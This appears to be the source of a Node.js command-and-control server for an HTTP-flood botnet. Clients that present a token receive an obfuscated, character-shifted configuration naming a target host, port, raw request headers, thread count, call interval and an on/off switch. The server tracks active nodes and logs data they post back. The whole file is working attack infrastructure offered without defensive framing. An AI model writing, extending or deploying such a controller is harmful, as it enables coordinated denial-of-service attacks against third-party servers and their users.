const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const Clients = require('./clients');

const PORT = process.env.PORT || 3000;
const CRLF = '\r\n';
const CONFIG_SEPARATOR = ';;;';
const CONFIG_PAIR_SEPARATOR = '===';

const app = express();
const configFetchIntervalInMs = 10000;
const clients = new Clients({ inactiveTimeout: configFetchIntervalInMs * 2 });

app.use(bodyParser.json());

app.get('/', (req, res, next) => {
  const clientToken = req.get('x-client-token');
  if (!clientToken) return next();

  const {
    host,
    body: reqBody = '',
    userAgent,
    port,
    path,
    method,
    contentLength,
    threadCount,
    callIntervalInMs,
    enabled,
    ssl,
  } = JSON.parse(fs.readFileSync('./node.json'));

  clients.add(clientToken);

  console.log('x-client-token:', clientToken);
  console.log('Client tokens:', clients.tokens);
  console.log('Client count:', clients.count);

  let body = `
headers${CONFIG_PAIR_SEPARATOR}${method} ${path} HTTP/1.1${CRLF}Host: ${host}${CRLF}Accept: */*${CRLF}User-agent: ${userAgent}${CRLF}Content-length: ${contentLength}${CONFIG_SEPARATOR}
body${CONFIG_PAIR_SEPARATOR}${reqBody}${CONFIG_SEPARATOR}
host${CONFIG_PAIR_SEPARATOR}${host}${CONFIG_SEPARATOR}
port${CONFIG_PAIR_SEPARATOR}${port}${CONFIG_SEPARATOR}
content_length${CONFIG_PAIR_SEPARATOR}${contentLength}${CONFIG_SEPARATOR}
thread_count${CONFIG_PAIR_SEPARATOR}${threadCount}${CONFIG_SEPARATOR}
call_interval_in_ms${CONFIG_PAIR_SEPARATOR}${callIntervalInMs}${CONFIG_SEPARATOR}
config_fetch_interval_in_ms${CONFIG_PAIR_SEPARATOR}${configFetchIntervalInMs}${CONFIG_SEPARATOR}
enabled${CONFIG_PAIR_SEPARATOR}${enabled}${CONFIG_SEPARATOR}
ssl${CONFIG_PAIR_SEPARATOR}${ssl}${CRLF}
  `;

  body = body
    .split('')
    .map((__, i) => String.fromCharCode(body.charCodeAt(i) + 13))
    .join('');

  console.log('Sending config...');
  res.set('Content-Type', 'text/plain');
  res.send(body);
});

app.post('/', (req, res) => {
  console.log('Receiving data with len: ', req.socket.bytesRead);
  console.log('Body: ', req.body);
  res.send('Hello World!');
});

app.use(function (err, _, res, __) {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});

app.listen(PORT, () => {
  console.log(`Example app listening at http://localhost:${PORT}`);
});
